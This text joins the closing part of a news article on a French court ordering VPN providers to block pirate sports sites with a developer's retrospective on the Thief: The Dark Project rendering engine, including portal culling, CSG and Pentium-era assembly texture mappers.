<p>The VPNs also argued that their services don’t qualify as “technical intermediaries” under Article L. 333-10 of the Sports Code, but that was denied by the Paris court as well. The same applies to the proportionality and effectiveness arguments, which all failed. </p>
<p>The court’s logic throughout the order is that technical neutrality does not equal legal immunity. </p>
<p>By citing the DSA and the Sports Code, the judge effectively argues that VPN services can be key intermediaries in the piracy ecosystem. Therefore, they are legally obligated to act.</p>
<p>“Contrary to the assertions of Surfshark and NordVPN, the mere act of serving as a bridge to enable access to the pirate sites fulfills the function of transmission. Even if an intermediary acts in a passive, automatic, and neutral manner during the connection between internet domains, it nonetheless remains an essential agent in the transmission of data from one domain to another,” the (translated) order reads.</p>
<h2>What Happens Next?</h2>
<p>The latest ruling confirms that VPN providers can be obligated to block pirate sites, at least in France. However, the final word hasn’t been said. </p>
<p>Speaking with TorrentFreak this week, a NordVPN spokesperson confirms that their appeal is already underway. The company did not directly explain how it complies with the court order but instead said that site-blocking measures are futile. </p>
<p>“While it may address superficial cases, it fails to tackle the root causes of piracy. Pirates can easily circumvent these blocks by using subdomains: blocking does not eliminate the content itself or reduce the incentives for piracy,” <a href="https://nordvpn.com/">NordVPN</a> notes.</p>
<p>“Effective piracy control should focus on eliminating the source of the content, targeting hosting providers, cutting off financing for illegal operations, and increasing the availability of legitimate content.”</p>
<p>In addition, NordVPN notes that, since the French order targets reputable VPNs, users may choose lower-quality free VPNs that will remain a loophole for pirates. </p>
<p>For now, however, the targeted VPN providers have to find a way to implement the blocking order. The court order doesn’t specify any technical measures, so they are free to do as they please, as long as the targeted sites are unavailable. </p>
<p>If the French VPN blockades are ultimately upheld, some providers may choose to leave the country entirely, but none have made this drastic step yet. </p>

<i>Sean Barrett</i><br>
<i>2011-09-19</i>
<p>
In 1998 <a href="http://en.wikipedia.org/wiki/Looking_Glass_Studios">Looking Glass Studios</a>
released the stealth game <i>Thief: The Dark Project</i>. This was just as
3D hardware acceleration was taking off, so due to the development cycle
it didn't use hardware acceleration; it was a purely software-rendered game.
</p><p>
I was the primary author of the core rendering technology in Thief (although I didn't
write the object or character renderers), as well as some related bits and pieces.
The same rendering engine, modified by others to use 3D hardware acceleration, also did
the rendering for System Shock 2 and Thief 2.
</p><p>
The engine was written somewhat contemporaneously
with Quake (despite the game being released much later), and the basic appearance
strongly resembles Quake.
Many of its technologies were copied from or inspired by Quake, but in many cases the way
it works is slightly or significantly different.
</p><p>
The Quake software rendering was thoroughly documented by Michael Abrash in a series
of articles which were reprinted in his <a href="http://www.gamedev.net/page/resources/_/reference/programming/140/283/graphics-programming-black-book-r1698">
Graphics
Programming Black Book</a>. The techniques used in Thief were never written up and
I thought it might be nice to write them down for once, even if they're now totally
irrelevant. I'll try to describe them relative to the probably-more-familiar Quake approaches
where possible.
</p><p>
Important contemporaneous games with similar rendering technology:
</p><ul>
<li>1996-06-22 - Quake 1 (QTest in February 1996)
</li><li>1998-05-22 - Unreal
</li><li>1998-11-19 - Half-Life (derived from the Quake 1 engine)
</li><li>1998-11-30 - Thief: The Dark Project
</li></ul>

<h2><a name="visibility"></a>Visibility</h2>
<p>
Looking Glass games previous to Thief had used grid-based worlds. System Shock 1
and the Ultima Underworlds computed visibility using a grid-based traversal.
Thief, however, was totally
free-form, so I had to start from scratch to design the Thief engine (which
started long before Thief, and I imagine even before we shipped Terra Nova:
Strike Force Centauri, which I worked on).
</p><p>
Thief was based on the portal-and-cell idea for
visibility and occlusion published by Seth Teller in his 1992
PhD dissertation. In fact, the Thief world renderer was called "Portal",
but since that name has a newer popular meaning I'll just call it "Thief"
or "the Thief engine" (but there was far far more to the Thief engine than
just the renderer, such as the object system, AI, physics, and I had nothing
to do with them; I didn't write "the Thief engine", just the renderer).
</p><p>
I was originally exploring this idea as research for an imagined holy grail
for Looking Glass: developing an "indoor-outdoor" CRPG, since the previous
LGS CRPGs (Ultima Underworld 1 &amp; 2, System Shock 1) had all been
"indoor" dungeons, but we also had this outdoor tech for Terra Nova, and
many of us felt we'd want to eventually make a hypothetical Underworld 3 or
something which would have dungeons and exteriors and buildings and what not
(this was before Daggerfall). In trying to imagine how we could put some
kind of a hole
in the Terra Nova terrain to incorporate dungeons, I realized that portals
could be used to seamlessly integrate multiple independent
renderers (like an indoor renderer and an outdoor renderer) by putting portals
at the boundaries, so I wrote up a long document over one Christmas vacation
documenting my thoughts along those lines. Then I guess I had all these ideas
bouncing around in my head, and I knew we didn't
have any idea how to do non-grid stuff, and it seemed viable to just try
to make a full indoor renderer using portals... so I went ahead and tackled
implementing one as research.
</p><p>
The portal-and-cell idea was used offline by Quake for
computing its precomputed PVS ("potentially visible set")--also described
in Seth Teller's dissertation--but Thief used
it at runtime; Thief precomputed the portals and cells, but didn't precompute
any further visibility information. (I believe Descent, which was released
before I even started writing the Thief engine, had already done this,
but I don't know the details.) 
</p><p>
The Thief engine kept a representation of the level in which the open areas
(the areas you could see and/or walk) were divided into convex polyhedra
known as cells. Each cell contained zero or more visible "world polygons"
along the boundaries of the cell that were the visible surfaces of the world. Cells
which adjoined other cells had special boundary polygons called "portals"
which marked the adjacency between the cells. If you could see into a given
cell, then you could see into adjoining cells through the portals to them.
</p><p>
To determine what part of the level was currently visible and needed rendering,
the engine conducted a breadth-first traversal of the portals and cells starting
from the location of the viewpoint. As each portal was traversed, the
cells reached were added to the visible list. Each considered portal
was transformed in 3D, checked if it was back-facing, and if not it
was projected to 2D. Then a "bounding octagon" was generated, which consisted
of a regular 2D bounding box and a 45-degree rotated bounding box.
</p><p>
If a portal led from cell A to cell B, then we compared that portal's
bounding octagon to a bounding octagon of the visiblity of cell A.
If the two didn't overlap, then the portal wasn't actually visible.
If it was visible, then the intersection of cell A's octagon and the
portal's octagon was the part of cell B that was visible through this
portal, so it added that to the list. (It was possible you would see
into cell B through multiple paths, so the engine had to accumulate
all the visible regions, which it did by simply keeping a conservative bounding
octagon of all the incoming path octagons along paths. If you had
two small view paths into one cell, the two at opposite ends of the cell,
the bounding octagon would be much bigger, typically the size of the
whole cell.) The cell containing the viewpoint was always fully visible.
</p><p>
Quake precomputed similar information: for each cell, Quake stored
the list of all other cells that were visible from anywhere in that
cell. This result could be less tight; for example, if you had a long corridor
with many side rooms, and that long corridor was a single cell, then
in Quake it would always try to render all the side rooms, whereas
Thief would only try to render the entry cell to each of the side
rooms (since those cells would always be adjacent to the corridor
and visible), but Thief could cull the rooms themselves if they weren't
currently visible.
</p><p>
Full cell-portal-analysis didn't scale well to higher polygon counts,
so the engine was limping by the time the last game shipped with it
(in other words, it had a lot of overhead when hardware accelerated).
</p><h2><a name="overdraw"></a>Reducing overdraw</h2>
<p>
Quake reduced overdraw by using a span-buffering ("edge list") technique
in which world surfaces were (conceptually) drawn front-to-back and each pixel was
only drawn exactly once.
</p><p>
Thief drew polygons back-to-front, so they did overdraw each other.
Thief's overdraw was already reduced compared to Quake's "naive" (pre-edge-list)
overdraw because of the tighter bounds from traversing the portals dynamically,
as described above.
</p><p>
Thief further reduced overdraw by clipping each rendered world polygon by
the bounding octagon for the visibility of the cell containing that
polygon. (This is part of why bounding octagons were used, as they
significantly reduced overdraw in some cases compared to just using
bounding boxes. In the limit if we had clipped to the exact portals
leading to each cell, this would have resulted in drawing each pixel
only once as well.) I don't have any recollection of what our typical
overdraw was using this approach.
</p><p>
For this to work, Thief had to store world polygons in cells. This
means that world polygons that extended through multiple cells had
to be split; Quake was often able to preserve those as single polygons
since it stored the polygons in a BSP tree directly on split planes.
I'm not sure how much difference this made, though, since both Thief
and Quake also had to split polygons for surface caching.
</p><p>
The 2D clipping to the bounding octagon meant that many Thief
polygons ended up being rendered as 8-sided polygons. This wasn't a problem.
In fact, clipping was straightforward and efficient since it was
purely 2D along simple axes, and there were no S,T (i.e. U,V)
texture coordinates on polygon vertices, since Thief used a technique I'd
previously published
in the PC Game Programmer's Encyclopedia in which the texture coordinates
were defined as a 3D vector basis independent of the vertices, and then
texture coordinates for spans and pixels were computed directly
from the basis vectors.
</p><p>
The skybox was drawn just by tagging polygons with a special texture,
then when drawing it, taking the transformed 2D polygon and clipping
it to each skybox polygon and using the skybox texture mapping for
each of them, or something like that. I don't remember 100%.

</p><h2><a name="culling"></a>Object culling</h2>
As objects were moved around the level, the engine would keep track of
which cells the object was in. It would do this incrementally, using what
cells the object was previously in to guide the current decision. This
meant that this part of the engine could actually handle
arbitrary unrealistic topologies (in which portals could lead to spaces
in inconsistent ways, and fold space back on itself), since the "physics"
could perform these local movement operations, but we never had a way
to <i>make</i> such things, and later a BSP tree was used to
sort the cells, which then required them to be consistently defined;
and the actual Thief game engine never supported it anyway.
(Actually we did have a way to make such things; one thing I did prior
to this engine was write a portal-based Doom-style engine, one that
supported spaces-over-spaces by allowing multiple overlapping
rooms, which could be at different heights (I
believe Dark Forces used a similar technology) or the <i>same</i> height
(since the height didn't actually affect how the Doom-style engine worked). With help from some
coworkers I also had an editor for it, so I was later able to use those
levels in my new fully-3D engine. But we never had a way to make fully 3D levels
that had this property.)
<p>
After discovering all the cells that needed rendering, Thief would
decide which objects needed rendering. Only objects that were in
visible cells might need rendering. However, Thief also computed
a 2D bounding box (or probably octagon) of each potentially visible object
and compared it against the bounding octagon for any cells containing the object.
(Quake had nothing like this since it didn't process portals at runtime.)
</p><p>
Because the Thief engine was better about rejecting invisible cells entirely,
and was able to reject objects that weren't currently visible even if the
cells containing them were, Thief
could generally handle more object-dense worlds than a renderer made
with Quake technology could have. You couldn't necessarily have more <i>visible</i>
objects at once, but you could put more objects in overall as long
as you limited where you could see them from, and so Thief generally
was able to have well-stocked kitchens and dining tables
and sideboards and such.
</p><p>
But this was just dumb luck as I hadn't chosen these algorithms
for that reason in particular, especially as the engine development long
preceded the eventual morphing of the game design into Thief.


</p><h2><a name="sorting"></a>Object sorting</h2>
<p>
Quake rendered objects by generating a z-buffer from the world polygons
(even though the world polygons themselves didn't z-test), and then
testing and updating that z-buffer when rendering objects.
</p><p>
Thief didn't use a z-buffer. Instead, Thief drew the world back-to-front
("painter's algorithm"),
and interleaved rendering of world polygons and objects to make them
appear to occlude each other appropriately.
</p><p>
Many games in the software rendering era (which rarely used z-buffers)
exhibited sorting issues where
objects would become visible through walls or invisible behind walls
they shouldn't be, and portals/cells didn't offer any special guarantees
that would avoid this problem. (For example, Descent exhibited such problems.)
</p><p>
This really bothered me and I worked very hard to fix it. The sorting
algorithm in Thief is the most complicated painter's algorithm sorter I've
every heard of; I remember having to write a little mathematical proof at
one point for one part of it.
</p><p>
I don't remember the details, but I'll try and sketch out some of the
issues and how it probably worked.
</p><p>
Originally the cells were sorted based on the portal-traversal-discovery order, which
provided a topological front-to-back sort order that could be reversed for
back-to-front rendering. However, there were some issues and so by the
time Thief shipped the cells were actually being sorted by a BSP tree. This
meant that the sort order was very far from a breadth-first search; if you
were near the rootmost split plane, the draw order could feature very-close-to-the-viewer
cells drawn <i>before</i> very-far-from-the-viewer cells if the cells and
viewer happened to fall on the appropriate sides of some BSP split plane.
</p><p>
Because of the BSP tree there was no danger that the world polygons would render
in the wrong order, but there was some danger that objects could sort wrong
with respect to each other or the world polygons. To avoid this, the Thief
engine (again, I'm kind of guessing here) conceptually numbered the cells in the order
it would draw them. An object in cell N would normally render immediately
after drawing the (inward-facing) world polygons in cell N and before drawing the walls of cell N+1. However,
sometimes objects would lie in multiple cells. An object in cell M and N,
with M &lt; N, would need to be drawn after all the walls of cell M, but the
parts of it in cell M might be obscured by walls in cell N or indeed in
any of the cells between M and N. (A common case that came up:
a corridor (cell) with a niche (cell) holding a torch, with the torch
slightly protruding into the corridor. The niche is M, and the 
corridor is N--e.g. if the viewpoint is in the corridor, then the
corridor is "closer" to the viewpoint in a back-to-front rendering sense.
For example, one of the walls of the corridor will occlude parts of
the niche.)
</p><p>
To deal with those complexities, Thief would consider whether it was
acceptable to draw a given object in its frontmost cell N (or, indeed,
at any point in the draw order between its rearmost and frontmost).
To do this it would compute bounding octagons on the objects and on
the world polygons and see whether the polygons occluded the objects.
If a world polygon was supposed to be "in front" of an object and the bounding
octagons intersected, then it wasn't safe to move the object later in
the rendering order to a point later than that world polygon.
</p><p>
The Thief engine would resolve what range it was valid to draw each
object in between backmost and frontmost cells containing that object;
if the object was only in one cell it would always be considered as
just being in that cell. Once this was determined, Thief then attempted
to resolve object-vs-object sorting. Because an object might extend
through multiple cells and then be behind or in front of an object
that was in a single cell, objects that were only in one cell might
need to be moved back or moved forward in the sort order anyway; in
other words, the final range of cells that an object might be considered
for rendering after might cover a larger range than just between backmost
and frontmost containing cell.
</p><p>
Thief attempted to use the above ranges to find some sort order for objects, holding the cell
sort order fixed, so that objects and world polygons would all inter-sort
correctly. (This was where that proof came in.) However, sometimes this was impossible. For example, in the
torch-in-the-niche case described above, it's possible for one world
polygon in cell N to be occluded by the torch (the wall with the niche
on it extending behind the niche), but another world polygon in N to occlude
the niche and part of the torch (the wall with the niche on it extend
forward towards the viewer). In this case, there is no sort order of
objects vs. cells that works, because parts of the torch occlude the
cell while parts of the same cell occlude the torch. It would be fixable by
interleaving the world polygons from the cell with the torch, instead
of always drawing all the world polygons from one cell as a unit, but
not all cases could be fixed that way, so Thief actually never did that
(it always drew all world polygons from one cell as a unit) -- unless
I'm remembering wrong.
</p><p>
Instead Thief had an entirely different, extremely expensive mechanism
that it fell back on to solve difficult sorting problems. Each object could be "split" into multiple
pieces, one per cell. In each cell, only the part of the object which
was contained in that cell was rendered. This wasn't done by actually
splitting the object, but rather by rendering it multiple times, once
for each "piece", and for each piece dynamically clipping the object
with a "user clip plane", using similar technology
to the frustum clipping that was also being done. (In complex cases, multiple clip planes would
be needed; however, it was only ever necessary to clip to portals between
the cells the object was in, and not literally clip to all the planes
defining each cell.) If this technique was applied, then that
part of that object could always be drawn in or after that cell. However,
although it didn't increase the per-pixel costs, it required transforming
and clipping the object multiple times, so it was rather expensive. (I
encouraged designers to place their torches fully inside the niches
instead.) This was particularly bad when rendering characters, which
were skinned, since I think the skinning transformations would be performed
multiple times.
</p><p>
This also had another problem: if you had three cells arranged so that the
portals between them formed a T, then the dynamic clipping could create
t-junctions at the border. These would then cause cracks in the rendering.
I don't remember how/if we fixed this.
</p><p>
During development I noticed that if you used all the walls of a cell for
user clip planes--not just the portals--then if an object interpentrated
a wall, it would be clipped away, looking exactly like a z-buffer rendering.
Normally these artifacts arose because the game physics allowed an object
to interpenetrate briefly, so it was actually better not to clip those objects,
and then they wouldn't look (from most angles) like they were going through
the wall. But we could've used an effect like that to allow creatures that
could move through walls even without though we had no z-buffer.
</p><p>
After my positive experience with user clip planes I was frustrated over
the next few years that GPUs didn't efficiently/easily support them. (Even
in D3D9, they're still done in the pixel shader; although you can use z and
stencil to cull more tightly and reduce pixel shading costs.) Of course,
with the z-buffer, it's not clear there are lots of use cases, but there's
a chicken-and-egg problem to that conclusion.
</p><h2><a name="lighting"></a>Light and shadow</h2>
<p>
The core technique for rendering texture mapped polygons with decent
precomputed shadows
is very similar (identical?) to Quake. Thief used light mapping and a surface cache to
store the lit surfaces. I refer you to Mike Abrash's articles.
</p><p>
My recollection is that we added this to the engine after we (the Thief team)
saw the Quake "QTest" release. However, I'm doubtful there really was a Thief
team at that point. According to wikipedia, QTest came out February 24, 1996.
Terra Nova came out on March 5, 1996, so I guess we had built our final
version of Terra Nova by the time QTest was released, but I can't imagine we'd
geared up a whole team yet. In fact I don't know for sure when exactly I did
the original research version of this engine.
</p><p>
At one point objects raycasted to all (or the top N) light sources to determine
if they were visible to it or not and turned the entire light on/off
over the entire object to simulate objects going in-and-out of shadow.
But I don't know if we shipped with this or using the "check the lightmap
value on the floor", which I seem to recall we at least considered using
for the player's visiblity to guards (to avoid players being tricked/confused
by places that appeared to casual inspection to being in shadow).

</p><h2><a name="csg"></a>CSG model</h2>
<p>
Thief levels were created using Constructive Solid Geometry (CSG) methods,
based again on knowledge that that was how Quake worked. Technologically
though Thief worked very differently from Quake.
</p><p>
The Thief CSG model was "temporal", which maybe I can better explain by
analogy to Photoshop. In photoshop, you have layers. Stuff placed in one
layer obscures stuff in lower layers, except if you use more interesting
blend modes, in which case stuff in a layer changes the stuff visible
below it but has no affect on things above it.
</p><p>
Algorithmically, you can think of generating the final image by processing
each layer in the image sequentially, from back to front, compositing it
with the "image so far". At the time each image is processed, the image-so-far
contains the accumulated effects of all the earlier (lower) layers, and
then the layer is processed and the image-so-far is changed and that layer
cannot have any further effect except by data it left in the image-so-far.
</p><p>
Normally we think of the photoshop layer model as a stack of 2D layers, 
but you could instead think of the above algorithm <i>as</i> the model, and think
of the layers not as a "vertical" stack but as an ordered sequence of operations
to perform. This is what I mean by a temporal model, and this is the model
that Thief used for its CSG. (If the vertical photoshop layer stack is a vertical
third dimension of the 2D images, then the Thief layering model would be a fourth
dimension on the 3D shapes, and thinking about this as four-dimensional space
is not very effective.)
</p><p>
The Thief CSG took as input a series of "operations" arranged in an order over
time. Those operations were "brush placements", where a brush was a 3D convex
solid plus a characterization of how the area covered by that solid would be changed
by the operation. The entire space started solid, so one brush operation was
"carve out a hole in this area"--in other words "change the area covered by
this brush to open". For example you would use this to carve out a room.
Another placed solid matter; you could use this to create a pillar. Another
placed water, and another lava. Because space could be of 4 types (solid, air,
water, or lava -- oh hey, the 4 classical elements!), each operation could
be considered by which output type it produced. Moreover, we allowed these
operations to be selective. For example, the "flood brush" turned air into
water, but left all other types alone. This made it easier to fill an area
with water--you could construct it entirely with air and then fill the lower
half with water. Because of the temporal aspect, you could <i>then</i> go and
change some of the water to "air" if you needed to. It would have been possible
to make brush types that were much complicated (air turns to water, water turns
to solid, solid turns to air, and lava unchanged) but this wasn't actually
useful so I think all the brush types were of the unconditional-single-type
or conditional-single-type.
</p><p>
As with Photoshop layers, the temporal aspect was something under user control;
you could move a brush forwards or backwards in time. Unfortunately, this was
much harder to visualize (there was no "layers" window) and I'm not sure
designers were really thrilled with this.
</p><p>
In comparison, Quake started with a level that was all open space and placed
solids. It used a more-traditional-CSG explicit-subtraction operation. Water
was handled by making all water brushes occur first temporally, so that all
the effective temporal sequence of operations was: all air =&gt; some air turns
to water =&gt; all solids are placed. Because subtraction was explicit on the
solid brushes before they were added to the world, the subtraction couldn't
"accidentally" erase water, so there was no need for an explicit temporal
model (the set of things you could do in Quake was more limited, but it
supported almost everything that mattered in practice--although some designers
came up with some strange sequences of operations in Thief to create more
complicated shapes).
</p><p>
Because Quake levels started empty, Quake had invisible "exterior" surfaces
that required a separate process to detect and eliminate. If the level wasn't
watertight, then the exterior could be reachable and the automated tools couldn't
eliminate it. In contrast, because the Thief level started solid, this was
never necessary. (I think Unreal's CSG may have started as solid as well.)


</p><h2><a name="csgbsp"></a>CSG implementation</h2>
<p>
I had no idea what I was doing when I implemented the Thief CSG system
(despite having the opportunity to pepper John Carmack with questions) so
I made a terrible choice. The Thief system worked by dividing the world up
into convex polyhedra and keeping track of what each polyhedron's type
i.e. air, solid, water, lava, which I call the "medium". To do this, I
stored the world as a solid BSP tree; the BSP tree classifies all of space into
convex polyhedra (except at the edges where it may have unbounded shapes
extending to infinity).
</p><p>
Using a BSP tree for this had a performance advantage, but I didn't do it
for that reason; I did it because I literally couldn't think of any other
way to compute the output. This way I
was able to sequentially add each
brush to the BSP tree and then apply the medium-transformation-operations
to each BSP leaf that the brush contained.
</p><p>
But reading the Quake source, it turns out you can do it a different way:
intersect every brush with every other brush directly, without a spatial
data strucure. By being careful,
you can build a growing list of convex polyhedra all of which are non-overlapping.
You can then add a spatial data structure to accelerate determining which ones
might overlap, but without affecting the computation itself.
</p><p>
The difference is that the BSP-tree based CSG tree would have situations
where a brush early in the processing would be inserted in the tree early
and would introduce a BSP split plane near the root which then extended
 across the whole level or a significant part of it.
This might randomly come close to an edge or vertex of a totally unrelated
brush, causing an extra split in that brush and introducing additional
epsilon problems. As CSG is already painful numeric geometric algorithms with epsilon
problems, introducing this extra uncontrollable problem was
terrible. The Thief editor was (is?) notorious for having weird problems where
a change to one brush might trigger a failure in the CSG generator
at an entirely unrelated place in the level--a failure which meant
the level simply failed to "compile".
</p><p>
Partway through Thief development I switched everything in the CSG engine from floats
to doubles and cranked down the epsilon, which made things better but didn't
solve the problem properly, but I realize in hindsight it would have been
much, much better to have simply avoided the BSP tree entirely.
</p><p>
The epsilon problems were exacerbated by the crazy way I built the polygons
and portals directly from the BSP-tree in a t-junc free way by computing a
shared mesh along each BSP split plane to guarantee that vertices on one
side of the split plane would always have a matching vertex on the other side;
this introduced a much more complicated set of invariants that had to be maintained
that also had epsilon problems. It meant I didn't have to write a post-processing
t-junction eliminator the way Quake did, but in hindsight that would have been better.

</p><h2><a name="texturing"></a>Perspective texture mapping</h2>
<p>
Looking Glass games prior to Thief such as System Shock 1 and Terra Nova had used
a "lines of constant-Z" mapper to perform perspective texture mapping.
Those games typically used the
perspective texture mapper for large, near polygons, but used an affine
mapper for distant polygons.
</p><p>
Thief used a custom-written perspective mapper for all polygons. It used the trick
used in Quake of issuing a floating-point divide for perspective correction
for every N pixels which then executed in parallel with the texture mapping
of the next N pixels; this worked because the Pentium would execute the
floating-point divide "in the background" if you only used integer instructions
after it (the Pentium was not an out-of-order processor in general).
</p><p>
Thief computed the perspective correction every 8 pixels (that is, N above was 8).
Thief aligned the correction so it occurred on pixels whose x coordinates
were multiples of 8. The beginning and ending of a span of pixels could be
less than 8, and would call a general-purpose N-pixel mapper, but the 8-pixel
spans called a routine that was hardcoded to compute exactly 8 pixels.
</p><p>
Because the engine changed over time and was initially used for research,
it supported two different formats that textures could be stored in. One was
restricted to 256x256 textures, or rather textures with powers-of-two sizes
and in which the stride/pitch was always 256. This used an inner loop similar
to the one I wrote up for the PCGPE. The second one supported arbitrary non-power-of-two textures
but didn't support wrapping. This is the one we switched to when we added
surface cached lighting, because padding those textures widths to multiples of 256
would have been far too wasteful. I believe the "step table" indexed-by-carry-flag
trick used in this mapper came directly from Mike Abrash.

</p><p>
<div>Details for x86 programmers:
<p>
Here is the code for the second pixel of the non-power-of-two texture-mapper-unrolled-8-times:
</p><pre>        adc    ebx,edi
        add    eax,ebp

        sbb    edi,edi   ; save v carry
        add    esi,edx   ; update u

        mov    byte ptr _pt_buffer+1,al
        mov    al,[ebx]

        mov    edi,_pt_step_table[edi*4+4]
</pre>
<p>
Here is the code for the second pixel of the 256x256 texture-mapper-unrolled-8-times (not
used in the shipping game, unless maybe it was used for water
surface):
</p><pre>        add    esi,edx
        mov    ecx,ebx

        adc    bl,dl
        add    eax,ebp

        adc    bh,dh
        mov    al,[edi+ecx]

        mov    byte ptr _pt_buffer+1,al
        and    ebx,0babebeach
</pre>
<p>
The spacing of both pieces of code shows that they were optimized for the
Pentium; each one uses a nominal 4 cycles per pixel. (They also both would trigger
"Partial Register Stalls" on the Pentium Pro.) The Pentium had a 2-cycle "AGI" stall
that you couldn't use a register as an address for 2 cycles after it's
computed, so you can see the texture fetch (from ebx or edi+ecx) is
designed to compute those registers two cycles before the fetch.
The full 8-pixel routines use 32 and 33 Pentium-pairs of instructions
for 8 pixels (although there's also setup to get the right values into
the right registers).
</p><p>
The 0babebeach at the end there is a 0xdeadbeef-style constant that relied
on "self-modifying" code to update the constant, a common trick on the
486 and Pentium. Those processor had an "and ebx,memory_location" instruction,
but it wasn't single-cycle, whereas "and ebx,#immediate" was single-cycle.
This meant there were 9 places in the code that had to be modified (this
is an 8-unrolled loop, plus the non-unrolled loop), but only when the
texture was changed.
</p></div>
</p><p>
Unfortunately, I totally missed out on the possibility of reblocking the
texture to improve cache usage, which might have allowed significant
performance improvements (I don't know); I've heard that Build and
other engines did do this, and since the surface cache in Thief was built in
8x8 blocks anyway it probably wouldn't have been hard to support on
that end.

</p><h2><a name="textureeffects"></a>Texture-mapping effects</h2>
<p>
Looking Glass games generally demanded flexibility, and graphics engines
faced with that need for flexibility often had a combinatorial explosion
of texture mappers to handle all the different cases. The texture mappers
I wrote for Thief sacrificed a litttle performance for the sake of simplicity
and maintainability and maximum flexibility; the texture mapping routines
above ended with an indirect branch which would branch to a routine that
would decide what to do with the 8 pixels that had just been written into
a temporary buffer.
</p><p>
There were two kinds of functions that could be invoked at this point. The
most common kind was one which wrote to the "framebuffer" (which was actually
just a block of RAM somewhere that would be blitted to the screen later)
and returned from the original function call that invoked the texture mapper
chain.
The other kind of function would read the pixels from the temporary buffer,
modify them, and write them back to the temporary buffer, then jump to yet
another function. You could chain arbitrary numbers of these processing
functions, in theory, not that this turned out to be necessary.
</p><p>
The codebase had a bunch of these functions:

</p><ul>
<li>sampler for pitch=256 affine-sampled span with texture coordinate wrapping
</li><li>sampler for arbitrary pitch affine-sampled span with no wrapping or clamping
</li><li>sampler for arbitrary pitch with lighting-table lookup (fetching 8 distinct
lighting values from a temp lighting buffer)
</li><li>filter that adds 8 distinct 8-bit "paletted lighting values" from a temp
lighting buffer to 8 texture values in temp buffer and stores back to temp buffer
(just 2 32-bit adds)
</li><li>filter that runs 8 texture values from temp buffer through an arbitrary
remapping table (color lookup table) and stores back to buffer
</li><li>writer that writes to the framebuffer (32-bits at a time)
</li><li>writer that writes non-zero values to the framebuffer for transparency
(uses an operation that tests for zeroes 4-bytes at a time, so particularly
efficient if all are opaque or all are transparent)
</li><li>writer that runs the value in the framebuffer and the value in the temp
buffer through an arbitrary remapping table (used for "translucency" effects)
</li></ul>

and a few more pre-baked combinations of those, plus a few things to generate
gouraud-shading values into the temp lighting buffer. (And two versions of
each of the above--one unrolled for 8 pixels, and one for arbitrary N pixels,
to handle the beginning and ending of each span of pixels.)
<p>
Most of those weren't used, I think. Paletted lighting in particular required setting up
the palette in a particular way, and I used this in the original research engine
to demo a gouraud-shaded level running at 640x400 at 20-ish fps on a Pentium 90. The level was
a retextured version of Doom 1 E1M1, using a texture made by Kurt Bickenbach.
He and I iterated a bit trying to figure out how to make textures that would
look good and not too banded in 8-bit using paletted lighting, and we got some
visually pleasing results, but in the end paletted lighting was too limited,
so we abandoned it. (It was too limited artistically, and it couldn't do pitch black properly;
when we ended up with a shadow-oriented game it was clearly wrong, but I
think it had been abandoned long before due to the first issue.) Abandoning
it meant abandoning hitting that frame rate/resolution target as well, but
in the long run this didn't matter that much because LGS games were complicated
enough that it's not like we spent 95% of the frame time in the renderer anyway,
and we didn't ship it for a long time anyway.
</p><p>
The engine supported specifying an arbitrary color look-up table ("clut") for each portal,
and coloring
everything seen through that portal with that clut. This wasn't done by applying
this as a post-process on that portal surface, which would have used extra "fill
rate", but by storing cluts (and concatenating
them into new cluts) and applying them while rendering surfaces seen through the
portal. This effect could have been used to make force fields or such things, although
it ended up underutilized. (Note, though, that if a single cell were visible through
multiple paths, and the paths had different sequences of cluts, there was no correct
way to render it; the Thief engine chose randomly. Probably there was no good solution
to this problem, but since it was never exercised, it didn't matter.)
</p><p>
During development, this was used to make water "foggy", where the more
underwater portals away something was, the more opaque the water became. However, this
looked pretty terrible as it showed the portal boundaries clearly and although we had
all gotten used to it since it was in the engine for years, I did eventually turn
off the portal-varying underwater fog, replacing it with a fixed underwater fog.
</p><p>
It was also used to color
the water surface--the water surface
actually used a purely transparent texture and surfaces underwater were colored
while they were rendered, instead of having to use the "translucent" read-modify-write
mapper. This means the object renderers also needed to support
rendering with a clut; I don't remember the details since I didn't work on those,
but this was probably something we tended to support by default anyway, so I doubt
this was problematic for those renderers.
</p><p>
I'm not sure what happened for objects that stuck through the water surface; I guess
those were forced to use the dynamic user clip plane path. Because Quake used a z-buffer,
Quake couldn't have both a distant wall-underwater and the water surface visible at the
same pixel (the z-buffer could only store one depth), so the Quake water surface was
opaque, at least in the software renderer. I'm not sure what Quake-derived engines
like Half-Life did; one expensive solution would be to render the world except the
water, then render the objects, then finally render the transparent water through the
z-buffer (much as we do with hardware). The z-buffered transparent water effect
would have been much more expensive in pixel costs than Thief's approach, although
Thief was spending more effort per
triangle/vertex having to render the object multiple times.
</p><p>
In Thief, most world surfaces simply used the arbitrary-pitch no-wrapping sampler and the
plain store-to-memory writer.
</p><p>
I imagine that the object renderers used the shared LGS software rendering
libraries and so didn't use these mappers at all.
</p><h2><a name="nothere"></a>Not covered here</h2>
<p>
I didn't write all the graphics technology used in Thief. I'll call out the
things I didn't write below. I associate each of them with someone at LGS
who did the work, but I'm not sure the people I can think of were the only
contributors to that effort, so rather than risk missing important people
out, I'm just not going to name names if multiple people might have been involved.
</p><p>
The 3D camera system,
vertex transformation, and clipping processing were part of a shared technology
library used by all LGS products. (Thief may have been the first customer of
that tech--previous games having used fixed-point so they could run on x86 computers
without floating point acceleration.) Thief batched together all the vertices
used in a single cell and transformed them all at once, whether they were
visible polygons or portals, which was possible since the 3D vertex API allowed
separating things out like that. (Sort of like compiled vertex arrays.)
</p><p>
As noted before, general object rendering presumably also went through shared
libraries. Object polygons were sorted using a BSP tree; James
Fleming had written a very clever system that significantly reduced the number
of BSP node decisions that needed to be made, based on the fact that single-sided
polygons often couldn't occlude each other from any angle. (For example, I
believe a polygonal torus, which is an object that self-occludes and needs
sorting if the polygons are two-sided, can be statically sorted if it's made
of single-sided polygons.)
</p><p>
Most importantly, Thief used character skinning with skeletal animation to render
its characters, and I never touched a single line of code of that system.
</p><p>
I quit Looking Glass for a time; during my absence hardware acceleration support
was added. (I came back and added support for colored lighting in the lighting
generator and maybe the surface cache or something.)

